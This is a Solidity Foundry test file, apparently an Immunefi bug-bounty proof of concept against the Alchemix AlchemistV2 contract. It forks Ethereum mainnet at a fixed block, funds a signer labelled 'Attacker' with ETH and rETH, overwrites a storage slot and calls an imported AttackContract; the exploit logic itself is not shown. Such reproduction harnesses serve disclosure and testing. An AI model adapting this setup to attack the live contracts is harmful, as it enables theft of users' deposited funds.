// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "@immunefi/PoC.sol";
import "../../src/Alchemix/AttackContract.sol";

contract PoCTest is PoC {
    AttackContract public attackContract;
    IERC20[] tokens;
    IERC20 rETH = IERC20(0xae78736Cd615f374D3085123A210448E74Fc6393);
    IERC20 alETH = IERC20(0x0100546F2cD4C9D97f798fFC9755E47865FF7Ee6);
    address constant signer = 0x47ac0Fb4F2D84898e4D9E7b4DaB3C24507a6D503;
    address constant alchemistV2 = 0x062Bf725dC4cDF947aa79Ca2aaCCD4F385b13b5c;


    function setUp() public {
        // Fork from specified block chain at block
        vm.createSelectFork("https://rpc.ankr.com/eth", 18229973);

        // Deploy attack contract
        attackContract = new AttackContract();

        // Fund attacker contract
        uint flashLoanedFunds = 16500 ether;
        uint256 capitalRequirements = 3460202873481672000000;
        deal(EthereumTokens.NATIVE_ASSET, signer, 4723 ether);
        deal(rETH, signer, flashLoanedFunds + capitalRequirements);
        console.logBytes32(keccak256(abi.encode(signer, 52)));
        vm.store(address(0xCc9EE9483f662091a1de4795249E24aC0aC2630f), keccak256(abi.encode(signer, 52)), bytes32(uint256(0x1000000000000000000)));

        // Tokens to track during snapshotting
        tokens.push(rETH);
        tokens.push(alETH);

        setAlias(signer, "Attacker");

        console.log("\n>>> Initial conditions");
    }

    function testAttack() public snapshot(signer, tokens) {
        attackContract.initializeAttack();
    }
}
